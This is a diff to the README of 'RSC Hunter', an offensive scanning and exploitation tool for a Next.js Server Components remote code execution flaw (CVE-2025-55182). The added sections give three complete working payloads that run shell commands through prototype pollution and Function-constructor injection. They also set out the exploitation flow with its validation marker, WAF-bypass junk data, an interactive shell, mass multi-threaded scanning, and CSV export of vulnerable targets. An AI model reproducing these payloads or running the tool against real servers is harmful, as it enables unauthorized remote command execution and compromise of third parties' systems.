@@ -77,16 +77,24 @@ CVE-2025-55182 is a critical remote code execution vulnerability affecting Next.
 
 ### Exploitation
 
-**Dual Exploit Methods**
-1. **Primary**: Function constructor injection via chunk references
-2. **Fallback**: `__proto__` pollution with `_response._prefix` injection
+**Triple Exploit Methods** (Automatic fallback chain)
+1. **Primary (Method 3)**: msanft's PoC - `__proto__` pollution via base URL (most reliable)
+2. **Alternative (Method 2)**: Assetnote format with `_chunks` field and multiple endpoints
+3. **Fallback (Method 1)**: Function constructor injection via chunk references
 
-Both methods automatically attempted with intelligent fallback for maximum reliability.
+All methods automatically attempted in order for maximum reliability.
 
 **Command Execution**
 - Execute arbitrary commands on vulnerable targets
-- Output extraction via error digest parsing
-- Multiple endpoint testing for success
+- Output extraction via NEXT_REDIRECT digest parsing
+- Base URL-first approach for reliability
+- Intelligent endpoint fallback when needed
+
+**Reporting & Output**
+- CSV export of vulnerable targets only (domain + full URL)
+- No files saved by default (clean workspace)
+- Structured data format for easy analysis
+- Automatic timestamped filenames
 
 ### Interactive Shell
 
@@ -106,6 +114,40 @@ Shell features:
 - Target enumeration (`targets` command)
 - Background scanning while interacting
 - Clean target filtering (only shows vulnerable/errors)
+
+## Architecture
+
+### Modular Structure
+
+RSC Hunter is organized into clean, maintainable modules:
+
+```
+rschunter/
+├── rschunter.py          # Main scanner with CLI
+├── lib/
+│   ├── exploits.py       # Exploitation methods (3 techniques)
+│   ├── validators.py     # RCE validation & WAF detection
+│   └── utils.py          # Colors, junk data generation
+├── test_rschunter.py     # Comprehensive test suite
+└── nuclei-template.yaml  # Nuclei integration
+```
+
+**Core Modules:**
+
+- **exploits.py**: Contains all three exploitation methods
+  - `exploitMethod3()` - msanft's working PoC (primary)
+  - `exploitMethod2()` - Assetnote format with `_chunks`
+  - `exploitMethod1()` - Function constructor fallback
+  - `executeRemoteCommand()` - Intelligent method chaining
+
+- **validators.py**: Detection and validation logic
+  - `validateRCE()` - X-Action-Redirect header validation (11111 marker)
+  - `is_waf_block()` - WAF/firewall detection
+  - Handles validation as non-blocking advisory check
+
+- **utils.py**: Helper functions
+  - `Colors` - Terminal color constants
+  - `generate_junk_data()` - WAF bypass junk generation
 
 ## Installation
 
@@ -155,6 +197,18 @@ python3 rschunter.py targets.txt
 ```bash
 python3 rschunter.py targets.txt --threads 20
 ```
+
+**Enable debug output**
+```bash
+python3 rschunter.py targets.txt --debug
+```
+
+**Debug mode shows:**
+- RCE validation attempts
+- Detailed method execution flow
+- Response status codes
+- Response previews
+- Digest extraction process
 
 ### Interactive Shell
 
@@ -285,17 +339,49 @@ python3 rschunter.py windows-targets.txt \\
   --threads 15
 ```
 
+**Debug mode for troubleshooting:**
+```bash
+python3 rschunter.py --url https://example.com --debug
+```
+
+**Debug output includes:**
+- RCE validation details (11111 marker check)
+- Exact URLs being tested
+- HTTP response status codes
+- Response body previews (first 200 chars)
+- Digest extraction matches
+- Method execution flow
+
 ### Output
 
-**Report generation**
+**CSV Report Generation**
 
-Results are automatically saved to:
-- `scan_state.json` - Resume state and full results
-- `rsc-report.txt` - Human-readable vulnerability report
+By default, no files are saved. Use `--save` to export vulnerable targets:
 
-Custom report filename:
 ```bash
-python3 rschunter.py targets.txt -o custom-report.txt
+python3 rschunter.py targets.txt --save
+```
+
+This creates a CSV file (e.g., `rsc-scan_20251207_143022.csv`) containing **only vulnerable targets** with the following columns:
+- Domain
+- URL  
+- Passive detection (Yes/No)
+- Active detection (Yes/No)
+- Endpoint vulnerable (Yes/No)
+- Command execution output
+- Detection details
+- Timestamp
+
+**Custom output filename:**
+```bash
+python3 rschunter.py targets.txt --save -o vulnerables.csv
+```
+
+**State Management**
+
+Scan state is automatically saved every 10 targets to `scan_state_<timestamp>.json` for resume capability:
+```bash
+python3 rschunter.py --resume
 ```
 
 ## Nuclei Integration
@@ -563,22 +649,96 @@ Client Payload → Next.js Action Handler → decodeReplyFromBusboy
 
 ### Payload Structure
 
-**Method 1**: Function constructor injection
-```javascript
-{"1": 'I["$1:constructor:constructor"]', ...}
-```
+RSC Hunter uses three exploitation methods in priority order:
 
-**Method 2**: `__proto__` pollution (more reliable)
+**Method 3 (Primary)**: msanft's PoC - Direct base URL approach
 ```javascript
 {
   "then": "$1:__proto__:then",
   "status": "resolved_model",
+  "reason": -1,
+  "value": '{"then": "$B0"}',
   "_response": {
-    "_prefix": "var res = process.mainModule.require('child_process').execSync(...)",
+    "_prefix": "var res = process.mainModule.require('child_process').execSync('cmd',{'timeout':5000}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${res}`});",
     "_formData": {"get": "$1:constructor:constructor"}
   }
 }
 ```
+- **Most reliable method** - proven to work on real vulnerable servers
+- Sends directly to base URL (no endpoint enumeration)
+- Captures output via `digest` field in NEXT_REDIRECT error
+- Based on msanft's working PoC
+
+**Method 2 (Alternative)**: Assetnote format with `_chunks` field
+```javascript
+{
+  "then": "$1:__proto__:then",
+  "status": "resolved_model",
+  "reason": -1,
+  "value": '{"then": "$B1337"}',
+  "_response": {
+    "_prefix": "var res=process.mainModule.require('child_process').execSync('cmd').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/login?a=${res};307;`});",
+    "_chunks": "$Q2",
+    "_formData": {"get": "$1:constructor:constructor"}
+  }
+}
+```
+- Includes `_chunks` field for additional compatibility
+- Tests multiple endpoints (`/_next/data`, `/adfa`)
+- Used when Method 3 fails
+
+**Method 1 (Fallback)**: Function constructor injection
+```javascript
+{
+  "1": 'I["$1:constructor:constructor"]',
+  "2": 'I["command"]',
+  "3": 'I["return process.mainModule.require(\'child_process\').execSync(arguments[0]).toString()"]',
+  "4": 'I["$3($2)"]'
+}
+```
+- Alternative payload structure
+- Last resort when prototype pollution methods fail
+
+### Exploitation Flow
+
+```
+1. RCE Validation (Non-blocking)
+   ├─ Send: echo $((41*271))
+   ├─ Check: X-Action-Redirect header contains "11111"
+   └─ Continue even if validation fails
+
+2. Method 3 (msanft PoC)
+   ├─ Send to base URL directly
+   ├─ Extract digest from NEXT_REDIRECT error
+   └─ Success? → Return output
+
+3. Method 2 (Assetnote format)
+   ├─ Try /_next/data endpoint
+   ├─ Try /adfa endpoint
+   └─ Success? → Return output
+
+4. Method 1 (Function constructor)
+   ├─ Try multiple endpoints
+   └─ Success? → Return output
+
+5. Mark as protected/not exploitable
+```
+
+### Debug Mode
+
+Enable verbose logging to see the full exploitation process:
+
+```bash
+python3 rschunter.py --url https://target.com -exec "id" --debug
+```
+
+**Debug output shows:**
+- RCE validation attempt (echo $((41*271)) → 11111)
+- Exact URL being tested
+- HTTP response status codes
+- Response body preview (first 200 chars)
+- Digest extraction matches
+- Method success/failure
 
 ### Patch Status
 
